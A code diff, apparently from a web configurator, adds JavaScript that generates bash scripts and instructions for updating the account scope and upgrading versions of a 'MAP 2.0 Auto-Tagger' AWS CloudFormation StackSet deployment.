+            const region = document.getElementById('editor-region').value;
+            const action = document.querySelector('input[name="editor-action"]:checked').value;
+            const backfill = document.getElementById('editor-includeBackfill').checked && action === 'add';
+            const listId = action === 'remove' ? 'editor-remove-accountList' : 'editor-add-accountList';
+            const accounts = [...document.getElementById(listId).querySelectorAll('.editor-account-input')]
+                .map(el => el.value.trim())
+                .filter(v => /^\d{12}$/.test(v));
+
+            const stacksetName = `map-auto-tagger-${mpe}`;
+            const accountsJson = JSON.stringify(accounts);
+
+            const addCmds = accounts.map(id =>
+                `if ! grep -q '"${id}"' "$TEMPLATE"; then\n  sed -i.bak 's|"scoped_account_ids": \\[|"scoped_account_ids": ["${id}",|' "$TEMPLATE"\nfi`
+            ).join('\n');
+
+            const removeCmds = accounts.map(id =>
+                `sed -i.bak 's|"${id}"||g' "$TEMPLATE"\nsed -i.bak 's|,,|,|g; s|\\[,|[|g; s|,\\]|]|g' "$TEMPLATE"`
+            ).join('\n');
+
+            const script = `#!/bin/bash
+# MAP 2.0 Auto-Tagger — Update Script
+# Action: ${action} accounts | MPE: ${mpe}
+# Accounts: ${accounts.join(', ')}
+set -e
+
+STACKSET_NAME="${stacksetName}"
+REGION="${region}"
+MPE="${mpe}"
+ACTION="${action}"
+ACCOUNTS_TO_MODIFY='${accountsJson}'
+
+echo ""
+echo "  ┌─────────────────────────────────────────┐"
+echo "  │   MAP 2.0 Auto-Tagger — Update          │"
+echo "  │   StackSet: $STACKSET_NAME"
+echo "  │   Action: $ACTION"
+echo "  │   Accounts: $ACCOUNTS_TO_MODIFY"
+echo "  └─────────────────────────────────────────┘"
+echo ""
+
+# ── Step 1: Verify StackSet exists ────────────
+echo "Step 1: Checking existing deployment..."
+if ! aws cloudformation describe-stack-set --region "$REGION" --stack-set-name "$STACKSET_NAME" > /dev/null 2>&1; then
+    SINGLE_STATUS=\$(aws cloudformation describe-stacks --region "$REGION" --stack-name "$STACKSET_NAME" --query 'Stacks[0].StackStatus' --output text 2>/dev/null || echo "NONE")
+    if [ "$SINGLE_STATUS" != "NONE" ] && [ "$SINGLE_STATUS" != "None" ]; then
+        echo "  ⚠️  Single-account stack '$STACKSET_NAME' found (status: $SINGLE_STATUS)."
+        echo "     This update tool targets multi-account StackSet deployments."
+        echo "     For single-account scope changes, update SSM directly:"
+        echo "       aws ssm get-parameter --name '/auto-map-tagger/$MPE/config' --region $REGION"
+        echo "       # Edit the JSON, then:"
+        echo "       aws ssm put-parameter --name '/auto-map-tagger/$MPE/config' --value '<new-json>' --type String --overwrite --region $REGION"
+        exit 1
+    fi
+    echo "  ❌ No deployment '$STACKSET_NAME' found in region $REGION."
+    echo "     Run the initial deploy.sh from the configurator first."
+    exit 1
+fi
+echo "  ✅ StackSet found"
+
+# ── Step 2: Fetch current template and update scope in place ──
+echo ""
+echo "Step 2: Updating account scope..."
+
+TEMPLATE=$(mktemp /tmp/map-update-XXXX.yaml)
+# Read the StackSet's live TemplateBody directly; avoids depending on the S3
+# staging copy (which exists only for the initial multi-account deploy and may
+# have been garbage-collected or never created for a single-account deployment
+# later promoted to multi-account).
+if ! aws cloudformation describe-stack-set \\
+        --region "$REGION" \\
+        --stack-set-name "$STACKSET_NAME" \\
+        --query "StackSet.TemplateBody" \\
+        --output text > "$TEMPLATE" 2>/dev/null; then
+    echo "  ❌ Could not read StackSet TemplateBody. Aborting."
+    rm -f "$TEMPLATE"
+    exit 1
+fi
+if [ ! -s "$TEMPLATE" ]; then
+    echo "  ❌ StackSet TemplateBody is empty. Aborting."
+    rm -f "$TEMPLATE"
+    exit 1
+fi
+
+echo "  Current scope:"
+grep "scoped_account_ids" "$TEMPLATE" | head -1 | sed 's/.*scoped_account_ids/  scoped_account_ids/'
+
+${action === 'add' ? addCmds : removeCmds}
+rm -f "$TEMPLATE.bak"
+
+NEW_SCOPE=$(grep -o '"scoped_account_ids": \\[[^]]*\\]' "$TEMPLATE" | head -1 | sed 's/"scoped_account_ids": //')
+if ! python3 -c "import json; json.loads('$NEW_SCOPE')" 2>/dev/null; then
+    echo "  ❌ Scope update produced invalid JSON: $NEW_SCOPE"
+    echo "     Update SSM parameter directly instead."
+    rm -f "$TEMPLATE" "$TEMPLATE.bak"
+    exit 1
+fi
+sed -i.bak "s|ScopedAccounts: .*|ScopedAccounts: '$NEW_SCOPE'|" "$TEMPLATE"
+rm -f "$TEMPLATE.bak"
+
+echo "  Updated scope:"
+grep "scoped_account_ids" "$TEMPLATE" | head -1 | sed 's/.*scoped_account_ids/  scoped_account_ids/'
+
+# ── Step 3: Push update ──────────────────────
+echo ""
+echo "Step 3: Pushing update to all accounts..."
+
+UPDATE_OUT=$(aws cloudformation update-stack-set \\
+    --region "$REGION" \\
+    --stack-set-name "$STACKSET_NAME" \\
+    --template-body "file://$TEMPLATE" \\
+    --capabilities CAPABILITY_NAMED_IAM 2>&1) || true
+
+if echo "$UPDATE_OUT" | grep -q "No updates"; then
+    echo "  StackSet already up to date"
+elif echo "$UPDATE_OUT" | grep -q "OperationId"; then
+    echo "  StackSet update initiated"
+    WAIT=0
+    while [ $WAIT -lt 600 ]; do
+        STATUS=$(aws cloudformation list-stack-set-operations \\
+            --region "$REGION" \\
+            --stack-set-name "$STACKSET_NAME" \\
+            --query "Summaries[0].Status" --output text 2>/dev/null)
+        if [ "$STATUS" = "SUCCEEDED" ]; then
+            echo "  ✅ Update complete — all accounts updated"
+            break
+        elif [ "$STATUS" = "FAILED" ]; then
+            echo "  ❌ Update failed. Check:"
+            echo "     aws cloudformation list-stack-instances --region $REGION --stack-set-name $STACKSET_NAME"
+            break
+        fi
+        sleep 15
+        WAIT=$((WAIT + 15))
+        echo "  Still updating... (\${WAIT}s)"
+    done
+elif echo "$UPDATE_OUT" | grep -q "OperationInProgress"; then
+    echo "  ⚠️  Another operation is in progress. Try again in a few minutes."
+else
+    echo "  $UPDATE_OUT"
+fi
+${backfill ? `
+echo ""
+echo "  ⏳ Backfill runs automatically as part of the StackSet update."
+echo "     Check logs: aws logs tail /aws/lambda/map-auto-tagger-backfill-${mpe} --region ${region}"` : ''}
+
+rm -f "$TEMPLATE"
+
+echo ""
+echo "  ┌─────────────────────────────────────────┐"
+echo "  │   ✅ Update complete                     │"
+echo "  └─────────────────────────────────────────┘"
+`;
+
+            document.getElementById('editor-scriptContent').textContent = script;
+            window._editorScript = script;
+            window._editorMpe = mpe;
+
+            const instructions = `UPDATE INSTRUCTIONS — MAP Auto-Tagger Account Scope
+=========================================
+
+── Option 1: AWS CloudShell (Recommended) ──────────────────
+1. Log into the AWS Console for your management account.
+2. Open CloudShell (click the terminal icon in the top menu bar).
+3. Upload the file (CloudShell → Actions → Upload file):
+     update.sh
+4. Run:
+   bash update.sh
+
+── Option 2: Local AWS CLI ──────────────────────────────────
+1. Ensure AWS CLI v2 is installed and configured with credentials
+   for the management account.
+2. Download update.sh to your local machine.
+3. Open a terminal in the folder containing update.sh.
+4. Run:
+   bash update.sh
+
+─────────────────────────────────────────────────
+The script handles everything automatically:
+  - Verifies the existing StackSet deployment
+  - Updates the account scope parameter
+  - Pushes the update to all accounts in the org
+${action === 'add' && backfill ? `  - Re-runs backfill for newly added accounts (CloudTrail, last 90 days)\n` : ''}
+Check update status:
+   aws cloudformation list-stack-instances \\
+     --stack-set-name map-auto-tagger-${mpe} \\
+     --query "Summaries[*].[Account,Region,StackInstanceStatus.DetailedStatus]" \\
+     --output table
+   # Expected: SUCCEEDED for all accounts
+
+Note: Only resources created AFTER this update will be tagged in newly added accounts
+(unless backfill is enabled). Existing tags on removed accounts are not affected.`;
+
+            document.getElementById('editor-instructions').textContent = instructions;
+            editorSetStep(3);
+        }
+
+        function editorGenerateUpgrade(region) {
+            const scopeToMpe = document.getElementById('update-scopeToMpe').checked;
+            const mpeInputs = [...document.getElementById('update-mpeList').querySelectorAll('.update-mpe-input')];
+            const mpeRegex = /^(?=.*[A-Z])(?=.*[0-9])[A-Z0-9]{10}$/;
+            const selectedMpes = scopeToMpe
+                ? mpeInputs.map(el => 'mig' + el.value.trim()).filter(m => mpeRegex.test(m.slice(3)))
+                : [];
+
+            // Generate two baked templates (with + without backfill) using a placeholder
+            // MPE ID so the shell can sed-substitute the real MPE at runtime. Auto-detect
+            // of backfill presence in the stack picks the right variant.
+            const PLACEHOLDER = 'migUPGRADEPLACE';
+            const placeholderConfig = {
+                mpeId: PLACEHOLDER,
+                deployMode: 'single',
+                scopeMode: 'account',
+                useAccountScope: false,
+                stacksetAccounts: [],
+                scopedVpcIds: [],
+                tagNonVpcServices: true,
+                alertEmail: '',
+                customerName: '',
+                includeBackfill: false,
+                // Dates are irrelevant at upgrade time — the ParameterKey=X,UsePreviousValue=true
+                // list built below reuses the deployed values. Use a valid date format so the
+                // Default matches AllowedPattern.
+                agreementDate: '1900-01-01',
+                agreementEndDate: '2099-12-31',
+            };
+            const tmplNoBackfill = generateMainTemplate(placeholderConfig);
+            const tmplWithBackfill = generateMainTemplate(Object.assign({}, placeholderConfig, { includeBackfill: true }));
+
+            const mpeListShell = selectedMpes.length > 0
+                ? selectedMpes.map(m => `"${m}"`).join(' ')
+                : '';
+            const scopeNote = selectedMpes.length > 0
+                ? `specific MPE(s): ${selectedMpes.join(', ')}`
+                : 'all MAP Auto-Tagger deployments found in this account';
+
+            const script = `#!/bin/bash
+# MAP 2.0 Auto-Tagger — Upgrade Script
+# Target template version: ${TEMPLATE_VERSION}
+# Scope: ${scopeNote}
+# Region: ${region}
+#
+# Behavior:
+#   - Auto-detects single-account stacks and multi-account StackSets matching
+#     map-auto-tagger-mig*.
+#   - Reads each deployment's current version from SSM Parameter Store
+#     (/auto-map-tagger/<mpe>/version) and compares to the target.
+#   - Refuses cross-MAJOR upgrades (e.g. v19 → v21) without --force.
+#   - Warns on downgrade; requires --force to proceed.
+#   - Detects presence of the backfill Lambda in the stack and picks the
+#     matching baked template variant (backfill config is preserved).
+#   - Applies full template replacement via update-stack / update-stack-set
+#     with each existing parameter preserved (ParameterKey=X,UsePreviousValue=true).
+#   - For StackSets, uses OperationPreferences {Max=100%, Tolerance=100%,
+#     RegionConcurrency=PARALLEL} for parallel per-account rollout.
+set -e
+
+TARGET_VERSION="${TEMPLATE_VERSION}"
+REGION="${region}"
+SCOPE_MPES=(${mpeListShell})
+FORCE="\${1:-}"
+
+echo ""
+echo "  ┌──────────────────────────────────────────────────────┐"
+echo "  │   MAP 2.0 Auto-Tagger — Upgrade                       │"
+echo "  │   Target version: $TARGET_VERSION"
+echo "  │   Region: $REGION"
+echo "  │   Scope: ${selectedMpes.length > 0 ? 'specific MPE(s) — ' + selectedMpes.join(', ') : 'all MAP Auto-Tagger deployments in this account'}"
+echo "  └──────────────────────────────────────────────────────┘"
+echo ""
+
+if [ "$FORCE" = "--force" ]; then
+    echo "  ⚠️  --force flag set — version guard will not block cross-major / downgrade."
+    echo ""
+fi
+
+ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
+BUCKET="auto-map-tagger-\${ACCOUNT}"
+
+# ── Step 1: Enumerate deployments ────────────────────────────
+echo "Step 1: Scanning for MAP Auto-Tagger deployments..."
+
+STACKSETS=()
+STACKS=()
+
+if [ \${#SCOPE_MPES[@]} -gt 0 ]; then
+    for MPE in "\${SCOPE_MPES[@]}"; do
+        if aws cloudformation describe-stack-set --region "$REGION" --stack-set-name "map-auto-tagger-\${MPE}" > /dev/null 2>&1; then
+            STACKSETS+=("map-auto-tagger-\${MPE}")
+        elif aws cloudformation describe-stacks --region "$REGION" --stack-name "map-auto-tagger-\${MPE}" > /dev/null 2>&1; then
+            STACKS+=("map-auto-tagger-\${MPE}")
+        else
+            echo "  ⚠️  MPE '\${MPE}' — no StackSet or Stack found with name 'map-auto-tagger-\${MPE}' in $REGION. Skipping."
+        fi
+    done
+else
+    while IFS= read -r NAME; do
+        [ -n "$NAME" ] && STACKSETS+=("$NAME")
+    done < <(aws cloudformation list-stack-sets --region "$REGION" --status ACTIVE --query "Summaries[?starts_with(StackSetName, 'map-auto-tagger-mig')].StackSetName" --output text | tr '\\t' '\\n')
+    while IFS= read -r NAME; do
+        [ -n "$NAME" ] && STACKS+=("$NAME")
+    done < <(aws cloudformation list-stacks --region "$REGION" --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE UPDATE_ROLLBACK_COMPLETE --query "StackSummaries[?starts_with(StackName, 'map-auto-tagger-mig')].StackName" --output text | tr '\\t' '\\n')
+fi
+
+TOTAL=\$((\${#STACKSETS[@]} + \${#STACKS[@]}))
+if [ $TOTAL -eq 0 ]; then
+    echo "  ⚠️  No MAP Auto-Tagger deployments found matching criteria. Exiting."
+    exit 0
+fi
+
+echo "  Found \${#STACKSETS[@]} StackSet(s) and \${#STACKS[@]} Stack(s) — $TOTAL total."
+for SS in "\${STACKSETS[@]}"; do echo "    • StackSet $SS"; done
+for ST in "\${STACKS[@]}"; do echo "    • Stack    $ST"; done
+echo ""
+
+# ── Step 2: Write baked templates to disk ──────────────────────
+echo "Step 2: Preparing upgrade templates (version $TARGET_VERSION)..."
+TMPL_NB=$(mktemp /tmp/map-upgrade-nobackfill-XXXX.yaml)
+TMPL_BF=$(mktemp /tmp/map-upgrade-backfill-XXXX.yaml)
+
+cat > "$TMPL_NB" <<'MAP_UPGRADE_TEMPLATE_NO_BACKFILL_EOF'
+${tmplNoBackfill}
+MAP_UPGRADE_TEMPLATE_NO_BACKFILL_EOF
+
+cat > "$TMPL_BF" <<'MAP_UPGRADE_TEMPLATE_WITH_BACKFILL_EOF'
+${tmplWithBackfill}
+MAP_UPGRADE_TEMPLATE_WITH_BACKFILL_EOF
+
+echo "  ✅ Templates written."
+echo ""
+
+# ── Helper: compare SemVer versions ────────────────────────────
+version_parts() { echo "$1" | sed -E 's/^v//' | tr '.' ' '; }
+
+# Strict plain three-part numeric SemVer match, no pre-release / build suffix.
+# Prior behavior fell through to "patch" on malformed input because shell
+# integer tests (-lt/-eq) printed an error to stderr but did not abort the
+# function, leaving downgrade / cross-major checks silently misclassified.
+is_valid_semver() {
+    echo "$1" | grep -Eq '^v?[0-9]+\\.[0-9]+\\.[0-9]+$'
+}
+
+compare_versions() {
+    # Returns: "same" | "patch" | "minor" | "major" | "downgrade" | "error"
+    local FROM="$1" TO="$2"
+    if ! is_valid_semver "$FROM" || ! is_valid_semver "$TO"; then
+        echo "error"; return
+    fi
+    local FM FN FP TM TN TP
+    read FM FN FP <<< "$(version_parts "$FROM")"
+    read TM TN TP <<< "$(version_parts "$TO")"
+    if [ "$FROM" = "$TO" ]; then echo "same"; return; fi
+    if [ "$TM" -lt "$FM" ] || { [ "$TM" -eq "$FM" ] && [ "$TN" -lt "$FN" ]; } || { [ "$TM" -eq "$FM" ] && [ "$TN" -eq "$FN" ] && [ "$TP" -lt "$FP" ]; }; then
+        echo "downgrade"; return
+    fi
+    if [ "$TM" -gt "$FM" ]; then echo "major"; return; fi
+    if [ "$TN" -gt "$FN" ]; then echo "minor"; return; fi
+    echo "patch"
+}
+
+# ── Helper: upgrade a single deployment ────────────────────────
+upgrade_one() {
+    local KIND="$1"       # "stack" or "stackset"
+    local NAME="$2"       # full name including mpe suffix
+    local MPE="\${NAME#map-auto-tagger-}"
+
+    echo "── $KIND: $NAME ──────────────────────────────"
+
+    # Read current version from SSM. Deployments from before version visibility
+    # (added in a v20 MINOR release) have no such param — treat them as pre-target
+    # and allow the upgrade without running the SemVer guard.
+    local CURRENT
+    CURRENT=$(aws ssm get-parameter --region "$REGION" --name "/auto-map-tagger/\${MPE}/version" --query Parameter.Value --output text 2>/dev/null || echo "unknown")
+
+    if [ "$CURRENT" = "unknown" ]; then
+        echo "  ⚠️  No version parameter found in SSM — deployment predates version visibility."
+        echo "     Proceeding with upgrade (SemVer guard skipped)."
+    else
+        local CMP
+        CMP=$(compare_versions "$CURRENT" "$TARGET_VERSION")
+        echo "  Current: $CURRENT → Target: $TARGET_VERSION ($CMP)"
+
+        if [ "$CMP" = "error" ] && [ "$FORCE" != "--force" ]; then
+            echo "  ❌ Could not parse SemVer for comparison (current=$CURRENT, target=$TARGET_VERSION)."
+            echo "     Expected vMAJOR.MINOR.PATCH. Re-run with --force to override the guard."
+            return 1
+        fi
+
+        if [ "$CMP" = "same" ]; then
+            echo "  ✅ Already on target version. Skipping."
+            return 0
+        fi
+
+        if [ "$CMP" = "downgrade" ] && [ "$FORCE" != "--force" ]; then
+            echo "  ❌ Downgrade detected ($CURRENT → $TARGET_VERSION). Refusing."
+            echo "     Re-run with --force to override."
+            return 1
+        fi
+
+        if [ "$CMP" = "major" ] && [ "$FORCE" != "--force" ]; then
+            echo "  ❌ Cross-MAJOR upgrade detected ($CURRENT → $TARGET_VERSION). Refusing."
+            echo "     MAJOR bumps per SemVer may require customer action (see CHANGELOG.md)."
+            echo "     Re-run with --force to override, or upgrade through intermediate MAJOR versions."
+            return 1
+        fi
+    fi
+
+    # Detect backfill presence in the stack to pick the matching template variant
+    local HAS_BACKFILL="false"
+    if [ "$KIND" = "stackset" ]; then
+        if aws cloudformation describe-stack-set --region "$REGION" --stack-set-name "$NAME" --query "StackSet.TemplateBody" --output text 2>/dev/null | grep -q 'BackfillFunction'; then
+            HAS_BACKFILL="true"
+        fi
+    else
+        if aws cloudformation describe-stack-resources --region "$REGION" --stack-name "$NAME" --query "StackResources[?LogicalResourceId=='BackfillFunction'].LogicalResourceId" --output text 2>/dev/null | grep -q 'BackfillFunction'; then
+            HAS_BACKFILL="true"
+        fi
+    fi
+
+    local SRC_TMPL
+    if [ "$HAS_BACKFILL" = "true" ]; then
+        SRC_TMPL="$TMPL_BF"
+        echo "  Backfill detected in existing stack → using with-backfill template variant."
+    else
+        SRC_TMPL="$TMPL_NB"
+        echo "  No backfill in existing stack → using no-backfill template variant."
+    fi
+
+    # MPE-substitute the placeholder
+    local TMPL=\$(mktemp /tmp/map-upgrade-${PLACEHOLDER}-XXXX.yaml)
+    sed "s|${PLACEHOLDER}|\${MPE}|g" "$SRC_TMPL" > "$TMPL"
+
+    # Parameter preservation: build a --parameters list with UsePreviousValue=true
+    # for every parameter the existing stack/stack-set declares. AWS CLI v2 has NO
+    # --use-previous-parameters flag (only --use-previous-template, different thing);
+    # passing that flag fails with "Unknown options". The per-parameter form below
+    # is the documented equivalent.
+    #
+    # We also avoid listing parameters the current stack doesn't declare (e.g. a
+    # pre-ReconciliationInterval stack upgrading to a template that adds it).
+    # CFN picks up the new template's Default for parameters omitted from the
+    # --parameters list, which is the intended behavior for newly-added params.
+    local PARAM_KEYS
+    if [ "$KIND" = "stackset" ]; then
+        PARAM_KEYS=$(aws cloudformation describe-stack-set \\
+            --region "$REGION" --stack-set-name "$NAME" \\
+            --query "StackSet.Parameters[].ParameterKey" --output text 2>/dev/null)
+    else
+        PARAM_KEYS=$(aws cloudformation describe-stacks \\
+            --region "$REGION" --stack-name "$NAME" \\
+            --query "Stacks[0].Parameters[].ParameterKey" --output text 2>/dev/null)
+    fi
+    if [ -z "$PARAM_KEYS" ]; then
+        echo "  ⚠️  Could not enumerate existing parameters for $NAME. Aborting."
+        rm -f "$TMPL"
+        return 1
+    fi
+    local PREV_PARAMS=""
+    for K in $PARAM_KEYS; do
+        PREV_PARAMS="$PREV_PARAMS ParameterKey=$K,UsePreviousValue=true"
+    done
+
+    if [ "$KIND" = "stackset" ]; then
+        echo "  Pushing StackSet update (parallel rollout, 100% tolerance)..."
+        local OUT
+        OUT=$(aws cloudformation update-stack-set \\
+            --region "$REGION" \\
+            --stack-set-name "$NAME" \\
+            --template-body "file://$TMPL" \\
+            --parameters $PREV_PARAMS \\
+            --capabilities CAPABILITY_NAMED_IAM \\
+            --operation-preferences "MaxConcurrentPercentage=100,FailureTolerancePercentage=100,RegionConcurrencyType=PARALLEL" \\
+            2>&1) || true
+
+        if echo "$OUT" | grep -q "No updates"; then
+            echo "  ✅ StackSet already matches target template. SSM version will be refreshed."
+        elif echo "$OUT" | grep -q "OperationId"; then
+            echo "  StackSet update initiated. Polling (up to 30 min)..."
+            local WAIT=0
+            while [ $WAIT -lt 1800 ]; do
+                local STATUS
+                STATUS=$(aws cloudformation list-stack-set-operations --region "$REGION" --stack-set-name "$NAME" --query "Summaries[0].Status" --output text 2>/dev/null)
+                if [ "$STATUS" = "SUCCEEDED" ]; then
+                    echo "  ✅ StackSet upgrade complete."
+                    break
+                elif [ "$STATUS" = "FAILED" ] || [ "$STATUS" = "STOPPED" ]; then
+                    echo "  ❌ Update failed. Per-account status:"
+                    aws cloudformation list-stack-instances --region "$REGION" --stack-set-name "$NAME" --query "Summaries[?StackInstanceStatus.DetailedStatus!=\\\`SUCCEEDED\\\`].[Account,Region,StackInstanceStatus.DetailedStatus,StatusReason]" --output table
+                    rm -f "$TMPL"
+                    return 1
+                fi
+                sleep 30
+                WAIT=$((WAIT + 30))
+                echo "  Still updating... (\${WAIT}s)"
+            done
+        elif echo "$OUT" | grep -q "OperationInProgress"; then
+            echo "  ⚠️  Another operation is in progress on this StackSet. Try again in a few minutes."
+            rm -f "$TMPL"
+            return 1
+        else
+            echo "  $OUT"
+            rm -f "$TMPL"
+            return 1
+        fi
+    else
+        echo "  Pushing Stack update..."
+        local OUT
+        OUT=$(aws cloudformation update-stack \\
+            --region "$REGION" \\
+            --stack-name "$NAME" \\
+            --template-body "file://$TMPL" \\
+            --parameters $PREV_PARAMS \\
+            --capabilities CAPABILITY_NAMED_IAM \\
+            2>&1) || true
+
+        if echo "$OUT" | grep -q "No updates"; then
+            echo "  ✅ Stack already matches target template. SSM version will be refreshed."
+        elif echo "$OUT" | grep -q "StackId"; then
+            echo "  Stack update initiated. Waiting (up to 30 min)..."
+            aws cloudformation wait stack-update-complete --region "$REGION" --stack-name "$NAME" || {
+                echo "  ❌ Stack update failed."
+                aws cloudformation describe-stack-events --region "$REGION" --stack-name "$NAME" --query "StackEvents[?ResourceStatus=='UPDATE_FAILED'].[LogicalResourceId,ResourceStatusReason]" --output table | head -20
+                rm -f "$TMPL"
+                return 1
+            }
+            echo "  ✅ Stack upgrade complete."
+        else
+            echo "  $OUT"
+            rm -f "$TMPL"
+            return 1
+        fi
+    fi
+
+    rm -f "$TMPL"
+    echo ""
+    return 0
+}
+
+# ── Step 3: Process all deployments ────────────────────────────
+echo "Step 3: Upgrading \${#STACKSETS[@]} StackSet(s) and \${#STACKS[@]} Stack(s)..."
+echo ""
+
+UPGRADED=0
+SKIPPED=0
+FAILED=0
+
+for NAME in "\${STACKSETS[@]}"; do
+    if upgrade_one "stackset" "$NAME"; then
+        UPGRADED=$((UPGRADED + 1))
+    else
+        FAILED=$((FAILED + 1))
+    fi
+done
+
+for NAME in "\${STACKS[@]}"; do
+    if upgrade_one "stack" "$NAME"; then
+        UPGRADED=$((UPGRADED + 1))
+    else
+        FAILED=$((FAILED + 1))
+    fi
+done
+
+rm -f "$TMPL_NB" "$TMPL_BF"
+
+echo ""
+echo "  ┌──────────────────────────────────────────────────────┐"
+if [ $FAILED -gt 0 ]; then
+    echo "  │   ⚠️  Upgrade complete with failures                  │"
+    echo "  │   Processed: $UPGRADED succeeded, $FAILED failed       "
+    echo "  └──────────────────────────────────────────────────────┘"
+    exit 1
+else
+    echo "  │   ✅ Upgrade complete                                 │"
+    echo "  │   Processed: $UPGRADED deployment(s)                  "
+    echo "  └──────────────────────────────────────────────────────┘"
+fi
+`;
+
+            document.getElementById('update-scriptContent').textContent = script;
+            window._upgradeScript = script;
+            window._upgradeMpe = selectedMpes.length > 0 ? selectedMpes.join('-') : 'all';
+
+            const instructions = `UPGRADE INSTRUCTIONS — MAP Auto-Tagger ${TEMPLATE_VERSION}
+=========================================
+
+Target template version: ${TEMPLATE_VERSION}
+Scope: ${selectedMpes.length > 0 ? 'MPE(s) — ' + selectedMpes.join(', ') : 'all MAP Auto-Tagger deployments in this account'}
+Region: ${region}
+
+── Option 1: AWS CloudShell (Recommended) ──────────────────
+1. Log into the AWS Console for the account where the MAP Auto-Tagger is deployed.
+   (For multi-account deployments, this is the management account.)
+2. Open CloudShell (click the terminal icon in the top menu bar).
+3. Upload the file (CloudShell → Actions → Upload file):
+     upgrade.sh
+4. Run:
+   bash upgrade.sh
+
+   To force cross-MAJOR or downgrade:
+   bash upgrade.sh --force
+
+── Option 2: Local AWS CLI ──────────────────────────────────
+1. Ensure AWS CLI v2 is installed and configured with admin credentials
+   for the deployment account.
+2. Download upgrade.sh to your local machine.
+3. Run:
+   bash upgrade.sh
+
+─────────────────────────────────────────────────
+What the script does:
+  - Enumerates single-account Stacks and multi-account StackSets matching
+    map-auto-tagger-mig*.
+  - For each deployment, reads the current template version from SSM.
+  - Compares current vs target version (SemVer):
+      • same    → skip
+      • patch   → proceed
+      • minor   → proceed
+      • major   → refuse (unless --force)
+      • downgrade → refuse (unless --force)
+  - Detects whether the stack has the backfill Lambda and picks the
+    matching template variant. Backfill setting is preserved.
+  - Applies the upgrade while preserving every current parameter value
+    (scope, agreement dates, VPC config) via per-parameter UsePreviousValue=true.
+  - For StackSets: parallel rollout (100% tolerance, region PARALLEL) —
+    accounts update in parallel per AWS limit.
+
+Check status after the script runs:
+   aws ssm get-parameter --name /auto-map-tagger/<mpe>/version --query Parameter.Value
+   # Expected: ${TEMPLATE_VERSION}
+
+Note: the new template is bundled inside this upgrade.sh. No outbound
+network calls are made from your environment during the upgrade.`;
+
+            document.getElementById('update-instructions').textContent = instructions;
+            updateSetStep(3);
+        }
+
+        function editorDownload() {
+            const blob = new Blob([window._editorScript], { type: 'text/x-sh' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `update-${window._editorMpe}.sh`;
+            a.click();
+        }
+
+        function editorCopyInstructions() {
+            navigator.clipboard.writeText(document.getElementById('editor-instructions').textContent).then(() => {
+                const btn = document.querySelector('[onclick="editorCopyInstructions()"]');
+                const orig = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                setTimeout(() => { btn.textContent = orig; }, 2000);
+            });
+        }
+
+        // --- UI State ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const firstVpc = document.querySelector('.vpc-input');
+            if (firstVpc) {
+                firstVpc.addEventListener('blur', () => validateVpcInput(firstVpc));
+                firstVpc.addEventListener('input', () => validateVpcInput(firstVpc));
+            }
+            const firstAcct = document.querySelector('.stackset-account-id');
+            if (firstAcct) {
+                firstAcct.addEventListener('blur', () => validateAccountInput(firstAcct));
+                firstAcct.addEventListener('input', () => validateAccountInput(firstAcct));
+            }
+            // Editor: wire up first account input and MPE field
+            document.querySelectorAll('.editor-account-input').forEach(input => {
+                input.addEventListener('blur',  () => editorValidateAccount(input));
+                input.addEventListener('input', () => editorValidateAccount(input));
+            });
+            const editorMpe = document.getElementById('editor-mpeId');
+            if (editorMpe) {
+                editorMpe.addEventListener('blur', () => {
+                    const val = editorMpe.value.trim();
+                    const bad = val && !/^(?=.*[A-Z])(?=.*[0-9])[A-Z0-9]{10}$/.test(val);
+                    editorMpe.classList.toggle('error', bad);
+                    document.getElementById('editor-mpeId-error').style.display = bad ? 'block' : 'none';
+                });
+            }
+        });
+
+        function selectDeployMode(mode) {
+            document.querySelector(`input[name="deployMode"][value="${mode}"]`).checked = true;
+            document.getElementById('opt-single').classList.toggle('selected', mode === 'single');
+            document.getElementById('opt-multi').classList.toggle('selected', mode === 'multi');
+            document.getElementById('opt-single').style.outline = '';
+            document.getElementById('opt-multi').style.outline = '';
+            document.getElementById('multi-account-options').classList.toggle('hidden', mode !== 'multi');
+            document.getElementById('single-account-options').classList.toggle('hidden', mode !== 'single');
+            document.getElementById('prereq-multi').style.display = mode === 'multi' ? 'block' : 'none';
+        }
+
+        function toggleVpcScope() {
+            document.getElementById('vpc-scope-fields').classList.toggle('hidden', !document.getElementById('useVpcScope').checked);
+            updateBackfillScopeNote();
+        }
+
+        function toggleAccountScope() {
+            document.getElementById('account-scope-fields').classList.toggle('hidden', !document.getElementById('useAccountScope').checked);
+            updateBackfillScopeNote();
+        }
+
+        function updateBackfillScopeNote() {
+            const note = document.getElementById('backfill-scope-note');
+            if (!note) return;
+            const vpcScoped = document.getElementById('useVpcScope') && document.getElementById('useVpcScope').checked;
+            const acctScoped = document.getElementById('useAccountScope') && document.getElementById('useAccountScope').checked;
+            if (vpcScoped || acctScoped) {
+                note.textContent = t('ui_backfill_scope_note');
+                note.style.display = 'block';
+            } else {
+                note.style.display = 'none';
+            }
+        }
+
+        // --- Dynamic lists ---
+        function validateVpcInput(input) {
+            const v = input.value.trim();
+            if (v && !/^vpc-[0-9a-f]{8,17}$/.test(v)) {
+                input.style.borderColor = '#d13212';
+                input.title = t('err_vpc_format');
+            } else {
+                input.style.borderColor = '';
+                input.title = '';
+            }
+        }
+
+        function validateAccountInput(input) {
+            const v = input.value.trim();
+            if (v && !/^\d{12}$/.test(v)) {
+                input.style.borderColor = '#d13212';
+                input.title = t('err_account_format');
+            } else {
+                input.style.borderColor = '';
+                input.title = '';
+            }
+        }
+
+        function addStacksetAccount() {
+            const list = document.getElementById('stacksetAccountList');
+            const row = document.createElement('div');
+            row.className = 'entry-row';
+            const idInput = document.createElement('input');
+            idInput.type = 'text'; idInput.className = 'stackset-account-id';
+            idInput.placeholder = '123456789012'; idInput.maxLength = 12;
+            idInput.addEventListener('blur', () => validateAccountInput(idInput));
+            idInput.addEventListener('input', () => validateAccountInput(idInput));
+            const labelInput = document.createElement('input');
+            labelInput.type = 'text'; labelInput.className = 'account-label';
+            labelInput.placeholder = 'e.g., Prod Account';
+            const btn = document.createElement('button');
+            btn.className = 'btn-remove'; btn.title = 'Remove';
+            btn.onclick = function(){ removeEntry(this); };
+            btn.textContent = '×';
+            row.appendChild(idInput); row.appendChild(labelInput); row.appendChild(btn);
+            list.appendChild(row);
+        }
+
+        function addVpc() {
